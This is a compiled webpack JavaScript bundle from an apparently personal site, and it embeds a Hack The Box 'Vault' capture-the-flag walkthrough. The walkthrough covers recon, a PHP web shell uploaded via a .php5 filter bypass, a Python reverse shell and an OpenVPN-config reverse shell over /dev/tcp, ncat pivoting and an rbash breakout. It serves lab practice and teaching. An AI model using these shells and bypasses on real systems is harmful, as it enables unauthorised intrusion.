"use strict";(self["webpackChunkpersonal_website"]=self["webpackChunkpersonal_website"]||[]).push([[822],{7851:function(e,t,s){s.r(t),s.d(t,{default:function(){return q}});var p=s(6768),o=s.p+"img/image_1.5b0b0ac4.png",a=s.p+"img/image_1_1.5ec12348.png",r=s.p+"img/image_3.b4d383ba.png",n=s.p+"img/image_2.b4797c40.png",i=s.p+"img/image_4.1494b63a.png",c=s.p+"img/image_5.955b175b.png",h=s.p+"img/image_5_1.fdf34d9c.png",g=s.p+"img/image_5_2.6ca75732.png",l=s.p+"img/image_5_3.4541e11a.png",d=s.p+"img/image_6.7b0d2bbd.png",m=s.p+"img/image_7.aa21912b.png",u=s.p+"img/image_8.6f3ba86a.png",b=s.p+"img/image_9.fbde5533.png",f=s.p+"img/image_10.8886cd1d.png",v=s.p+"img/image_11.58c7a4c3.png",S=s.p+"img/image_12.2ee79eaa.png",y=s.p+"img/image_13.5256e3f4.png",k=s.p+"img/image_14.43f1eb3a.png",_=s.p+"img/image_15.8b76c7fa.png",w=s.p+"img/image_16.9e1f52a9.png",x=s.p+"img/image_17.37a782f3.png",C=s.p+"img/image_18.596bbc1c.png",D=s.p+"img/image_19.0ce135df.png",T=s.p+"img/image_20.c0200f55.png",N=s.p+"img/image_21.e228fa35.png",P=s.p+"img/image_22.ffa64857.png",A=s.p+"img/image_23.e1c8fd09.png";const E={class:"component-writeup"},I=(0,p.Fv)('<h1>Recon</h1><h2>Nmap</h2><pre><code>nmap -Pn -v -p- -sV --min-rate 1000 vault.htb -oN vault_nmap.txt\n</code></pre><pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n</code></pre><h1>Foothold (Port 80)</h1><p>Main page hints there is possibly a directory related to “sparklays” <img src="'+o+'" alt="Screenshots"> Turns out there is a directory under <a href="http://vault.htb/sparklays">http://vault.htb/sparklays</a><img src="'+a+'" alt="Screenshots"></p><p>Fuzzing with Gobuster</p><pre><code>gobuster dir -u http://vault.htb/sparklays -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php -o vault.htb_sparklays.txt\n</code></pre><p>Subdirectory in sparklays/design</p><pre><code>gobuster dir -u http://vault.htb/sparklays/design -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php -o vault.htb_sparklays_design.txt\n</code></pre><p><img src="'+r+'" alt="Screenshots"></p><p>Found admin login page at admin.php</p><pre><code>http://vault.htb/sparklays/admin.php\n</code></pre><p><img src="'+n+'" alt="Screenshots"></p><p>Another page names design.html</p><pre><code>http://vault.htb/sparklays/design/design.html\n</code></pre><p><img src="'+i+'" alt="Screenshots"> The link leads to</p><pre><code>http://vault.htb/sparklays/design/changelogo.php\n</code></pre><p><img src="'+c+'" alt="Screenshots"></p><p>Uploading test.png returns success <img src="'+h+'" alt="Screenshots"></p><p>And the file can be viewed at</p><pre><code>http://vault.htb/sparklays/design/uploads/&lt;filename&gt;\n</code></pre><p>But uploading test.php returns a failed message <img src="'+g+'" alt="Screenshots"></p><p>Fuzzing with Burp Intruder shows that it allows uploading .php5 files <img src="'+l+'" alt="Screenshots"></p><p>Uploading a simple file to test code execution with system()</p><pre><code>&lt;?php\necho &quot;hello\\n&quot;;\nsystem($_GET[&#39;cmd&#39;]);\n?&gt;\n</code></pre><p>can use system()</p><p><img src="'+d+'" alt="Screenshots"> Reverse shell from <a href="http://revshells.com">revshells.com</a></p><pre><code># Python3 #2 URL encoded\npython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.24%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22bash%22%29%27\n</code></pre><p><img src="'+m+'" alt="Screenshots"></p><h1>User.txt</h1><p><img src="'+u+'" alt="Screenshots"></p><p>SSH password in /home/dave/Desktop <img src="'+b+'" alt="Screenshots"></p><p><img src="'+f+'" alt="Screenshots"> Further enumeration shows:</p><ul><li>IP address for other servers</li><li>A potential password or encryption key <img src="'+v+'" alt="Screenshots"></li></ul><p>No nmap installed, therefore using a bash script to scan for ports (<a href="https://github.com/mnorin/bash-scripts/blob/master/utils/portscan.sh">https://github.com/mnorin/bash-scripts/blob/master/utils/portscan.sh</a>)</p><p><img src="'+S+'" alt="Screenshots"></p><p>Tunnel to DNS + Configurator server</p><pre><code>ssh -L 8888:192.168.122.4:80 dave@vault.htb\n</code></pre><p>Main page <img src="'+y+'" alt="Screenshots"></p><p>Second link goes to</p><pre><code>http://192.168.122.4/vpnconfig.php?function=testvpn\n</code></pre><p><img src="'+k+'" alt="Screenshots"></p><p>This suggests that it allows editing and executing a .ovpn file.</p><p>There is a blog post about code execution using ovpn files. (<a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da">https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</a>)</p><p>.ovpn file used</p><pre><code>remote 192.168.122.4\nnobind\ndev tun\nscript-security 2\nup &quot;/bin/bash -c &#39;/bin/bash -i &gt; /dev/tcp/192.168.122.1/8080 0&lt;&amp;1 2&gt;&amp;1&amp;&#39;&quot;\n</code></pre><p>The flag is in /home/dave/user.txt <img src="'+_+'" alt="Screenshots"></p><h1>Root.txt</h1><p>SSH password for dave on 192.168.122.4 (DNS) is in home directory <img src="'+w+'" alt="Screenshots"></p><p>Checking /etc/hosts shows the IP of the Vault server <img src="'+x+'" alt="Screenshots"></p><p><img src="'+C+'" alt="Screenshots"></p><p>Interesting commands to add routes to Vault subnet</p><pre><code>http://192.168.1.11:8888/DNS.zip\n\nroot@DNS:/var/www/DNS# cat interfaces \nauto ens3\niface ens3 inet static\naddress 192.168.122.4\nnetmask 255.255.255.0\nup route add -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5\nup route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28\n</code></pre><p>However, the IP does not seem to be reachable.</p><h1>Checked Writeup (Got Stuck Here)</h1><p>Issue:</p><ul><li>Identified the target IP to pivot to, but cannot seem to reach the server</li></ul><p>Checked writeup at this point (<a href="https://0xdf.gitlab.io/2019/04/06/htb-vault.html">https://0xdf.gitlab.io/2019/04/06/htb-vault.html</a>)</p><p>So by grepping the IP under log files, there are previously ran command that hints on how the users reached the DNS server from Vault</p><pre><code>grep -rHa &quot;192.168.5.2&quot; /var/log\n</code></pre><p>Commands previously ran by dave <img src="'+D+'" alt="Screenshots"></p><pre><code>/var/log/auth.log:Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f\n/var/log/auth.log:Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53\n/var/log/auth.log:Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53\n</code></pre><p>Creates a tunnel with a certain source port (as ssh cannot specify source port)</p><ul><li>that’s why nmap returned nothing, as it only allow traffic with src port 53 or 4444</li></ul><pre><code>/usr/bin/ncat -l 1234 --sh-exec &quot;ncat 192.168.5.2 987 -p 53&quot; &amp;\n</code></pre><p>Then ssh as dave, same password as before</p><pre><code>ssh dave@127.0.0.1 -p 1234\n</code></pre><p><img src="'+T+'" alt="Screenshots"></p><p>A root.txt.gpg file in the home directory <img src="'+N+'" alt="Screenshots"></p><p>Listing keys on each host</p><pre><code>gpg --list-keys\n</code></pre><p>There is a key on ubuntu host (first host)</p><p><img src="'+P+'" alt="Screenshots"></p><p>Copy file from vault to ubuntu using scp</p><pre><code># From vault to DNS\nscp -P 1234 dave@127.0.0.1:~/root.txt.gpg .\n\n# From DNS to ubuntu\nscp dave@192.168.122.4:~/root.txt.gpg .\n</code></pre><p>Decrypt with passphrase shown in /home/dave/Desktop/key <img src="'+A+'" alt="Screenshots"></p><h1>Extra: Shell breakout</h1><p><a href="https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e">https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e</a> Method -3</p><pre><code>ssh dave@127.0.0.1 -p 1234 -t bash\n</code></pre>',80),R=[I];function M(e,t){return(0,p.uX)(),(0,p.CE)("div",E,R)}var U=s(1241);const B={},F=(0,U.A)(B,[["render",M]]);var q=F}}]);
//# sourceMappingURL=822.c5901aff.js.map